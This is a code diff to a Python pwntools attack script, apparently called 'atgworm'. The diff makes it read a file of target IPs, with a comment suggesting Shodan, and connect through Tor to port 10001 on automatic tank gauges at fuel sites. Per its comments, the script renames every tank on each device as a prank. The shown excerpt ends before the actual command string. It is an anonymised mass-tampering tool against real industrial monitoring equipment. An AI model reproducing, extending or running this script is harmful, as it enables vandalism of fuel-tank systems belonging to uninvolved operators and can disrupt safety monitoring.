@@ -4,9 +4,20 @@ paper que inspirou script: https://telegra.ph/Hackeando-tanques-de-combust%C3%AD
 """
 from pwn import *
 from time import sleep
+import sys
+
+banner = """
+  __ _| |_ __ ___      _____  _ __ _ __ ___  
+ / _` | __/ _` \ \ /\ / / _ \| '__| '_ ` _ \ 
+| (_| | || (_| |\ V  V / (_) | |  | | | | | |
+ \__,_|\__\__, | \_/\_/ \___/|_|  |_| |_| |_|
+          |___/                              
+"""
+print(banner)
 
 # add ipList at list(use shodan to search)
-ipList = ['127.0.0.1', '1.1.1.1']
+arquivo = open(sys.argv[1])
+ips = arquivo.readlines()
 
 # usa proxy do tor durante as conexoes
 context.proxy = (socks.SOCKS5, 'localhost', 9050)
@@ -20,7 +31,7 @@ print "your ip: %s" % wg
 sleep(4)
 
 # tenta conectar no ip de ipList na porta 10001(porta default do ATG)
-for ip in ipList:
+for ip in ips:
 	try:
 		r = remote(ip, 10001)
 		# comando para mudar o nome de todos os tanques para "just 4 the lulz !!!!"
